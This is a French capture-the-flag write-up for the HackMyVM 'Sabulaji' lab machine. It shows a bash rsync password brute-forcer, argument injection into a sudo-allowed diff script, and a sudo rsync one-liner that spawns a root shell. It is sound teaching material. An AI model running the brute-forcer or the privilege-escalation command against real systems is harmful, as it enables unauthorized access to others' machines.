---
title: "Solution du CTF Sabulaji de HackMyVM.eu"
tags: [CTF,HackMyVM]
---

### Your Data's Gonna Be, My Love! 

Ce petit CTF commence avec un serveur rsync, ce qui nous change un peu.

```console
$ sudo nmap -T5 -p- 192.168.56.107
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.56.107
Host is up (0.00013s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
873/tcp open  rsync
MAC Address: 08:00:27:A7:53:D9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

Il y a deux partages :

```console
$ rsync rsync://192.168.56.107/

public          Public Files
epages          Secret Documents
```

Toutefois, le second (`epages`) est protégé par mot de passe.

On trouve une liste TODO sur le premier :

```console
$ rsync rsync://192.168.56.107/public/

drwxr-xr-x          4.096 2025/05/15 18:35:39 .
-rw-r--r--            433 2025/05/15 18:35:39 todo.list
$ rsync -av rsync://192.168.56.107/public/todo.list ./

receiving incremental file list
todo.list

sent 43 bytes  received 528 bytes  1.142,00 bytes/sec
total size is 433  speedup is 0,76
$ cat todo.list 
To-Do List
=========

1. sabulaji: Remove private sharing settings
   - Review all shared files and folders.
   - Disable any private sharing links or permissions.

2. sabulaji: Change to a strong password
   - Create a new password (minimum 12 characters, include uppercase, lowercase, numbers, and symbols).
   - Update the password in the system settings.
   - Ensure the new password is not reused from other accounts.
=========
```

Il est clairement question de mot de passe faible... Reste à savoir pour quel account. Même si ce n'est pas 100% clair pour moi j'ai supposé que le compte est `sabulaji`.

J'ai d'abord voulu utiliser le script Nmap `rsync-brute.nse` mais malgré plusieurs tentatives, je n'y suis pas parvenu.

Bizarrement ni Hydra, ni Ncrack, ni Medusa ne gèrent rsync ce qui est un peu fort pour un vieux proto Unix.

Sur Github, j'ai trouvé deux projets intéressants :

[GitHub - nonsleepr/rsyncbrute: An Rsync password brute-forcer in Go](https://github.com/nonsleepr/rsyncbrute)

[GitHub - ZyperX/rsync_bruteforcer: Rsync service bruteforcer](https://github.com/ZyperX/rsync_bruteforcer/tree/master)

Celui en Go est sans doute rapide, mais on ne sait pas trop quelles versions de rsync il gère.

Celui en Python est sans doute plus fiable, mais j'ai remarqué différents problèmes :
- trop d'output qui ralenti le programme
- lecture du fichier dictionnaire en une seule fois au lieu de ligne par ligne

J'ai donc adapté :

```bash
#!/bin/bash

if [ $# -lt 5 ]; then
    echo -e "\e[34mSyntax : ./rsync_brute.sh <username> <ip> <port> <wordlist> <module_directory>\e[0m"
    exit 1
fi

username=$1
ip=$2
port=$3
wordlist=$4
module=$5

count=0

while IFS= read -r password; do
    count=$((count + 1))
    
    export RSYNC_PASSWORD="$password"
    
    if rsync --contimeout=3 --port="$port" "rsync://$username@$ip/$module" > /dev/null 2>&1; then
        echo -e "\n[+] Password found: $password"
        exit 0
    fi

    if (( count % 5000 == 0 )); then
        echo "[*] $count passwords tried..."
    fi
done < "$wordlist"

echo "[!] Password not found after $count attempts."
```

Au boût d'un temps non négligeable, j'avais un mot de passe :

```bash
$ ./brute.sh sabulaji 192.168.56.107 873 wordlists/rockyou.txt epages
[*] 5000 passwords tried...
[*] 10000 passwords tried...
[*] 15000 passwords tried...
[*] 20000 passwords tried...
[*] 25000 passwords tried...
[*] 30000 passwords tried...
[*] 35000 passwords tried...
[*] 40000 passwords tried...
[*] 45000 passwords tried...
[*] 50000 passwords tried...
[*] 55000 passwords tried...
[*] 60000 passwords tried...
[*] 65000 passwords tried...
[*] 70000 passwords tried...
[*] 75000 passwords tried...
[*] 80000 passwords tried...
[*] 85000 passwords tried...
[*] 90000 passwords tried...

[+] Password found: admin123
```

C'était tout de même la grosse déception, car le partage `epages` étant en lecture seule et d'après la page d'index servit sur le port 80 on pouvait espérer que les deux étaient liées (et uploader un shell web).

### You suck at keeping secrets

On lieu de ça, on a un fichier Word :

```
secrets.doc: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1200, Locale ID: 2052, Author: vort, Template: Normal, Last Saved By: wp, Create Time/Date: Thu May 15 17:15:28 2025, Last Saved Time/Date: Thu May 15 17:15:34 2025, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Name of Creating Application: WPS Office H_0.0.0.0_{F1E327B, Security: 0
```

Il y a beau avoir du texte dans le document, j'ai quand même regardé les tags Exif au cas où :

```
exiftool secrets.doc | grep Author
Author                          : vortex
```

Le texte quant à lui parle d'un compte `welcome` :

> The admin, in a moment of questionable judgment, named the default account "welcome." I overheard a colleague chuckle about it, saying the password was something absurdly simple, like "P@ssw0rd123!"—hardly a secret worth keeping, but it’s been untouched for years.

Effectivement ça fonctionne :

```console
welcome@Sabulaji:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome),123(mlocate)
welcome@Sabulaji:~$ ls -al
total 24
drwxr-xr-x 2 welcome welcome 4096 May 16 01:21 .
drwxr-xr-x 4 root    root    4096 May 15 12:39 ..
lrwxrwxrwx 1 root    root       9 May 15 12:47 .bash_history -> /dev/null
-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout
-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc
-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile
-rw-r--r-- 1 root    root      44 May 15 12:49 user.txt
welcome@Sabulaji:~$ cat user.txt 
flag{user-cf7883184194add6adfa5f20b5061ac7}
```

### Guessing 101

On a la possibilité de lancer un script bash avec les droits d'un autre utilisateur :

```console
welcome@Sabulaji:~$ sudo -l
Matching Defaults entries for welcome on Sabulaji:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on Sabulaji:
    (sabulaji) NOPASSWD: /opt/sync.sh
welcome@Sabulaji:~$ ls -al /opt/sync.sh
-rwxr-xr-x 1 root root 385 May 16 01:39 /opt/sync.sh
welcome@Sabulaji:~$ ls -ald /opt/
drwxr-xr-x 2 root root 4096 May 16 01:39 /opt/
```

Le voici :

```bash
#!/bin/bash

if [ -z $1 ]; then
    echo "error: note missing"
    exit
fi

note=$1

if [[ "$note" == *"sabulaji"* ]]; then
    echo "error: forbidden"
    exit
fi

difference=$(diff /home/sabulaji/personal/notes.txt $note)

if [ -z "$difference" ]; then
    echo "no update"
    exit
fi

echo "Difference: $difference"

cp $note /home/sabulaji/personal/notes.txt

echo "[+] Updated."
```

Ici pas d'injection de commandes possibles. Au mieux, on peut dumper le contenu de `notes.txt`... Pas la fête.

```console
$ welcome@Sabulaji:~$ sudo -u sabulaji /opt/sync.sh empty 
Difference: 1d0
< Maybe you can find it...
[+] Updated.
```

On peut toutefois injecter des options pour rsync :

```console
welcome@Sabulaji:/home/sabulaji$ sudo -u sabulaji /opt/sync.sh --help
Difference: Usage: diff [OPTION]... FILES
Compare FILES line by line.

Mandatory arguments to long options are mandatory for short options too.
      --normal                  output a normal diff (the default)
  -q, --brief                   report only when files differ
  -s, --report-identical-files  report when two files are the same
  -c, -C NUM, --context[=NUM]   output NUM (default 3) lines of copied context
  -u, -U NUM, --unified[=NUM]   output NUM (default 3) lines of unified context
--- snip ---
```

Mais ce qu'il faudrait, c'est pouvoir lister le contenu du dossier `personal` de l'utilisateur qui contient sans doute quelque chose d'intéressant :

```console
sabulaji@Sabulaji:~$ ls -al
total 24
drwxr-xr-x 3 sabulaji sabulaji 4096 May 16 01:22 .
drwxr-xr-x 4 root     root     4096 May 15 12:39 ..
lrwxrwxrwx 1 root     root        9 May 15 12:47 .bash_history -> /dev/null
-rw-r--r-- 1 sabulaji sabulaji  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 sabulaji sabulaji 3526 Apr 18  2019 .bashrc
drwx------ 2 sabulaji sabulaji 4096 May 16 01:33 personal
-rw-r--r-- 1 sabulaji sabulaji  807 Apr 18  2019 .profile
```

J'ai beau avoir cherché comment provoquer un diff récursif, étant donné que le premier argument dans la commande est un fichier texte, c'était raté.

Notre seule chance, c'est visiblement de deviner un nom de fichier à dumper. J'ai tenté les trucs classiques comme `id_rsa` mais sans succès.

L'IA Gemini m'a donné quelques pistes et bingo, l'une d'elle était la bonne :

> Commencez par les noms de fichiers les plus courants pour les flags CTF :
> 
> - `flag.txt`
> - `secret.txt`
> - `password.txt`
> - `.bash_history` (peut contenir des commandes révélatrices)
> - `id_rsa` (clé SSH privée)
> - `config.txt`
> - `creds.txt`
> 
> Tentez chaque nom de fichier avec la technique du lien symbolique jusqu'à ce que vous trouviez le bon.

Mate un peu ça :

```console
welcome@Sabulaji:/home/sabulaji$ sudo -u sabulaji /opt/sync.sh personal/creds.txt
Difference: 0a1
> Sensitive Credentials:Z2FzcGFyaW4=
[+] Updated.
```

Le base64 se décode en `gasparin`  mais en réalité le base64 est le mot de passe.

```console
sabulaji@Sabulaji:~$ sudo -l
Matching Defaults entries for sabulaji on Sabulaji:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sabulaji may run the following commands on Sabulaji:
    (ALL) NOPASSWD: /usr/bin/rsync
```

Pour terminer le CTF on aura recours à un [GTFObin](https://gtfobins.github.io/gtfobins/rsync/#shell).

```console
sabulaji@Sabulaji:~$ sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt
flag{root-89e62d8807f7986edb259eb2237d011c}
```
